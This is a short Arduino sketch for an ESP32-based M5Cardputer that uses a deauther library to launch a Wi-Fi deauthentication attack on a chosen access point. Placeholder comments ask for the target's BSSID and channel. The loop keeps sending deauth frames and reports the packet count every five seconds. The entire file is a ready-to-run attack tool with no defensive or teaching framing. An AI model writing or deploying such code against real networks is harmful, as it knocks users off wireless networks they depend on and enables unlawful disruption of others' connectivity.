#include <ESP32Deauther.h>
#include <M5Cardputer.h>

ESP32Deauther deauther;

void setup() {
  Serial.begin(115200);
  M5Cardputer.begin();
  delay(1000);
  
  // Initialize the deauther
  if (!deauther.begin()) {
    Serial.println("Failed to initialize deauther: " + deauther.getLastError());
    while (true);
  }
  Serial.println("ESP32Deauther initialized");

  // Start deauthentication attack on a specific network
  String targetBSSID = "00:11:22:33:44:55"; // Replace with target network BSSID
  int channel = 1; // Replace with target network channel
  uint16_t reason = 7; // Deauth reason code
  
  if (deauther.deauthNetwork(targetBSSID, channel, reason)) {
    Serial.println("Started deauth attack on BSSID: " + targetBSSID);
  } else {
    Serial.println("Failed to start deauth: " + deauther.getLastError());
  }
}

void loop() {
  // Handle ongoing deauth attack
  deauther.handleDeauth();
  
  // Print packet count every 5 seconds
  static unsigned long lastPrint = 0;
  if (millis() - lastPrint > 5000) {
    Serial.printf("Packets sent: %u\n", deauther.getPacketCount());
    lastPrint = millis();
  }
}